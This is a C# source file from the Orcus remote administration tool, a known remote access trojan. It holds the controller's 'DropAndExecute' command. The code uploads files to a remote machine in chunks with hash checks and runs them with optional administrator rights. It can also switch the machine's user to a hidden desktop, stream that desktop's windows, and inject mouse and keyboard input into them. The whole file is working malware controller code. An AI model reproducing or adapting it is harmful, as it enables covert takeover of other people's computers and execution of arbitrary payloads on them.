using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using System.Windows;
using System.Windows.Input;
using Orcus.Administration.Commands.Native;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.DropAndExecute;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.NetSerializer;
using DisallowMultipleThreads = Orcus.Plugins.DisallowMultipleThreadsAttribute;

namespace Orcus.Administration.Commands.DropAndExecute
{
    [DisallowMultipleThreads]
    public class DropAndExecuteCommand : Command
    {
        private readonly object _uploadTasksLock = new object();
        private UploadTask _currentUploadTask;
        private bool _isStreaming;
        private bool _isUploading;
        private List<UploadTask> _uploadTasks;

        public RenderEngine RenderEngine { get; private set; }

        public override void Dispose()
        {
            base.Dispose();
            RenderEngine?.Dispose();
        }

        public event EventHandler UploadFinished;
        public event EventHandler StreamingStarted;
        //will only be fired when it was not stopped by the user
        public event EventHandler StreamingStopped;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((DropAndExecuteCommunication) parameter[0])
            {
                case DropAndExecuteCommunication.ResponseUploadCompleted:
                    var taskGuid = new Guid(parameter.Skip(1).Take(16).ToArray());
                    UploadTask uploadTask;
                    lock (_uploadTasksLock)
                        uploadTask = _uploadTasks?.FirstOrDefault(x => x.Guid == taskGuid);

                    if (uploadTask != null)
                    {
                        uploadTask.IsUploaded = true;
                        if (_uploadTasks.All(x => x.IsUploaded))
                            UploadFinished?.Invoke(this, EventArgs.Empty);
                    }
                    break;
                case DropAndExecuteCommunication.ResponseUploadFailed:
                    taskGuid = new Guid(parameter.Skip(1).Take(16).ToArray());
                    lock (_uploadTasksLock)
                        uploadTask = _uploadTasks?.FirstOrDefault(x => x.Guid == taskGuid);

                    if (uploadTask != null)
                    {
                        uploadTask.IsUploaded = false;
                        uploadTask.Progress = 0;
                        uploadTask.IsSent = false;

                        if (!_isUploading)
                            new Thread(Upload) {IsBackground = true}.Start();
                    }
                    break;
                case DropAndExecuteCommunication.ResponseBeginStreaming:
                    _isStreaming = true;
                    var windowDataLength = BitConverter.ToInt32(parameter, 1);
                    var windowData = Serializer.FastDeserialize<WindowUpdate>(parameter, 5);
                    RenderEngine = new RenderEngine(windowData, parameter, 5 + windowDataLength);
                    StreamingStarted?.Invoke(this, EventArgs.Empty);
                    AquireNextFrame(RenderEngine.GetNextWindowToRender());
                    break;
                case DropAndExecuteCommunication.ResponseWindowUpdate:
                    if (RenderEngine != null)
                    {
                        RenderEngine.UpdateWindows(Serializer.FastDeserialize<WindowUpdate>(parameter, 5), parameter,
                            BitConverter.ToInt32(parameter, 1) + 5);

                        if (_isStreaming && RenderEngine != null)
                            AquireNextFrame(RenderEngine.GetNextWindowToRender());
                    }
                    break;
                case DropAndExecuteCommunication.ResponseStopStreaming:
                    LogService.Warn((string) Application.Current.Resources["ApplicationClosed"]);
                    StreamingStopped?.Invoke(this, EventArgs.Empty);
                    break;
                case DropAndExecuteCommunication.ResponseFileExecuted:
                    LogService.Receive((string) Application.Current.Resources["FileExecutedSuccessfully"]);
                    break;
                case DropAndExecuteCommunication.ResponseFileExecutionFailed:
                    LogService.Error((string) Application.Current.Resources["FileCouldNotBeExecuted"]);
                    break;
                case DropAndExecuteCommunication.ResponseFileMightNotHaveExecutedSuccessfully:
                    LogService.Warn((string) Application.Current.Resources["FileMightNotHaveExecutedSuccessfully"]);
                    break;
                case DropAndExecuteCommunication.ResponseFileNotFound:
                    LogService.Error((string) Application.Current.Resources["ExecutionFileWasNotFound"]);
                    break;
                case DropAndExecuteCommunication.ResponseUserSwitched:
                    LogService.Receive((string) Application.Current.Resources["CurrentDesktopSwitched"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void StopStreaming()
        {
            _isStreaming = false;
            ConnectionInfo.SendCommand(this, (byte) DropAndExecuteCommunication.StopStreaming);
        }

        public void StopExecution()
        {
            _isStreaming = false;
            ConnectionInfo.SendCommand(this, (byte)DropAndExecuteCommunication.StopExecution);
        }

        public void SwitchUserToCurrentDesktop()
        {
            ConnectionInfo.SendCommand(this, (byte) DropAndExecuteCommunication.SwitchUserToHiddenDesktop);
        }

        public void SwitchUserToDefaultDesktop()
        {
            ConnectionInfo.SendCommand(this, (byte) DropAndExecuteCommunication.SwitchUserBack);
        }

        public void Execute(UploadTask uploadTask, ExecutionMode executionMode, bool runAsAdmin, string arguments)
        {
            var executeOptions = new ExecuteOptions
            {
                Arguments = arguments,
                ExecutionMode = executionMode,
                RunAsAdministrator = runAsAdmin,
                FileGuid = uploadTask.Guid
            };
            var data = Serializer.FastSerialize(executeOptions);

            ConnectionInfo.UnsafeSendCommand(this, data.Length + 1, writer =>
            {
                writer.Write((byte) DropAndExecuteCommunication.ExecuteFile);
                writer.Write(data);
            });
        }

        public void UploadTasks(List<UploadTask> uploadTasks)
        {
            lock (_uploadTasksLock)
            {
                _uploadTasks = uploadTasks;
                if (_currentUploadTask != null && !_uploadTasks.Contains(_currentUploadTask))
                    _currentUploadTask.IsCanceled = true;
            }

            if (!_isUploading)
                new Thread(Upload) {IsBackground = true}.Start();
        }

        public void RemoveRemoteFile(UploadTask uploadTask)
        {
            ConnectionInfo.UnsafeSendCommand(this, 17, writer =>
            {
                writer.Write((byte) DropAndExecuteCommunication.UploadCanceled);
                writer.Write(uploadTask.Guid.ToByteArray());
            });
        }

        public void MouseMove(int x, int y, long windowHandle)
        {
            ConnectionInfo.UnsafeSendCommand(this, 23, writer =>
            {
                writer.Write((byte) DropAndExecuteCommunication.WindowAction);
                writer.Write(windowHandle);
                writer.Write((byte) RemoteDesktopAction.Mouse);
                writer.Write((byte) RemoteDesktopMouseAction.Move);
                writer.Write(x);
                writer.Write(y);
                writer.Write(0);
            });
        }

        public void MouseDown(int x, int y, MouseButton mouseButton, long windowHandle)
        {
            ConnectionInfo.UnsafeSendCommand(this, 23, writer =>
            {
                writer.Write((byte) DropAndExecuteCommunication.WindowAction);
                writer.Write(windowHandle);
                writer.Write((byte) RemoteDesktopAction.Mouse);
                writer.Write((byte) MouseButtonToAction(mouseButton, true));
                writer.Write(x);
                writer.Write(y);
                writer.Write(0);
            });
        }

        public void MouseUp(int x, int y, MouseButton mouseButton, long windowHandle)
        {
            ConnectionInfo.UnsafeSendCommand(this, 23, writer =>
            {
                writer.Write((byte) DropAndExecuteCommunication.WindowAction);
                writer.Write(windowHandle);
                writer.Write((byte) RemoteDesktopAction.Mouse);
                writer.Write((byte) MouseButtonToAction(mouseButton, false));
                writer.Write(x);
                writer.Write(y);
                writer.Write(0);
            });
        }

        public void MouseWheel(int x, int y, int delta, long windowHandle)
        {
            ConnectionInfo.UnsafeSendCommand(this, 23, writer =>
            {
                writer.Write((byte) DropAndExecuteCommunication.WindowAction);
                writer.Write(windowHandle);
                writer.Write((byte) RemoteDesktopAction.Mouse);
                writer.Write((byte) RemoteDesktopMouseAction.Wheel);
                writer.Write(x);
                writer.Write(y);
                writer.Write(delta);
            });
        }

        public void KeyDown(int virtualKey, long windowHandle)
        {
            var scanCode = (short) NativeMethods.MapVirtualKey((uint) virtualKey, MapVirtualKeyMapTypes.MAPVK_VK_TO_VSC);
            ConnectionInfo.UnsafeSendCommand(this, 13, writer =>
            {
                writer.Write((byte) DropAndExecuteCommunication.WindowAction);
                writer.Write(windowHandle);
                writer.Write((byte) RemoteDesktopAction.Keyboard);
                writer.Write((byte) RemoteDesktopKeyboardAction.KeyDown);
                writer.Write(scanCode);
            });
        }

        public void KeyUp(int virtualKey, long windowHandle)
        {
            var scanCode = (short) NativeMethods.MapVirtualKey((uint) virtualKey, MapVirtualKeyMapTypes.MAPVK_VK_TO_VSC);
            ConnectionInfo.UnsafeSendCommand(this, 13, writer =>
            {
                writer.Write((byte) DropAndExecuteCommunication.WindowAction);
                writer.Write(windowHandle);
                writer.Write((byte) RemoteDesktopAction.Keyboard);
                writer.Write((byte) RemoteDesktopKeyboardAction.KeyUp);
                writer.Write(scanCode);
            });
        }

        private RemoteDesktopMouseAction MouseButtonToAction(MouseButton mouseButton, bool isDown)
        {
            switch (mouseButton)
            {
                case MouseButton.Left:
                    return isDown ? RemoteDesktopMouseAction.LeftDown : RemoteDesktopMouseAction.LeftUp;
                case MouseButton.Middle:
                    return isDown ? RemoteDesktopMouseAction.MiddleDown : RemoteDesktopMouseAction.MiddleUp;
                case MouseButton.Right:
                    return isDown ? RemoteDesktopMouseAction.RightDown : RemoteDesktopMouseAction.RightUp;
                case MouseButton.XButton1:
                    return isDown ? RemoteDesktopMouseAction.XButton1Down : RemoteDesktopMouseAction.XButton1Up;
                case MouseButton.XButton2:
                    return isDown ? RemoteDesktopMouseAction.XButton2Down : RemoteDesktopMouseAction.XButton2Up;
                default:
                    throw new ArgumentOutOfRangeException(nameof(mouseButton), mouseButton, null);
            }
        }

        private void Upload()
        {
            _isUploading = true;
            while (true)
            {
                lock (_uploadTasksLock)
                {
                    //cleanup
                    foreach (var uploadTask in _uploadTasks.Where(x => x.IsCanceled).ToList())
                        _uploadTasks.Remove(uploadTask);

                    _currentUploadTask = _uploadTasks.FirstOrDefault(x => !x.IsUploaded && !x.IsSent);
                }

                if (_currentUploadTask == null)
                    break;

                _currentUploadTask.Guid = Guid.NewGuid();

                using (
                    var fileStream = new FileStream(_currentUploadTask.SourceFile, FileMode.Open, FileAccess.Read,
                        FileShare.Read))
                {
                    using (var md5Hasher = new MD5CryptoServiceProvider())
                    {
                        var packet =
                            Serializer.FastSerialize(new FileTransferInfo
                            {
                                Name = _currentUploadTask.Name,
                                Guid = _currentUploadTask.Guid,
                                Length = (int) fileStream.Length,
                                Hash = md5Hasher.ComputeHash(fileStream)
                            });

                        ConnectionInfo.UnsafeSendCommand(this, packet.Length + 1, writer =>
                        {
                            writer.Write((byte) DropAndExecuteCommunication.InitializeFileTransfer);
                            writer.Write(packet);
                        });
                    }

                    fileStream.Position = 0;

                    var buffer = new byte[4096];
                    var guidData = _currentUploadTask.Guid.ToByteArray();
                    int read;
                    while ((read = fileStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        if (_currentUploadTask.IsCanceled)
                        {
                            ConnectionInfo.UnsafeSendCommand(this, 17, writer =>
                            {
                                writer.Write((byte) DropAndExecuteCommunication.UploadCanceled);
                                writer.Write(guidData);
                            });
                            lock (_uploadTasksLock)
                                _uploadTasks.Remove(_currentUploadTask);
                            continue;
                        }

                        ConnectionInfo.UnsafeSendCommand(this, read + 17, writer =>
                        {
                            writer.Write((byte) DropAndExecuteCommunication.SendPackage);
                            writer.Write(guidData);
                            writer.Write(buffer, 0, read);
                        });

                        _currentUploadTask.BytesUploaded += read;
                        _currentUploadTask.Progress = _currentUploadTask.BytesUploaded /
                                                      (double) _currentUploadTask.FileLength;
                    }

                    _currentUploadTask.IsSent = true;
                }
            }

            _isUploading = false;
        }

        private void AquireNextFrame(long windowHandle)
        {
            var package = new byte[9];
            package[0] = (byte) DropAndExecuteCommunication.GetWindowUpdate;
            Buffer.BlockCopy(BitConverter.GetBytes(windowHandle), 0, package, 1, 8);
            ConnectionInfo.SendCommand(this, package);
        }

        protected override uint GetId()
        {
            return 34;
        }
    }
}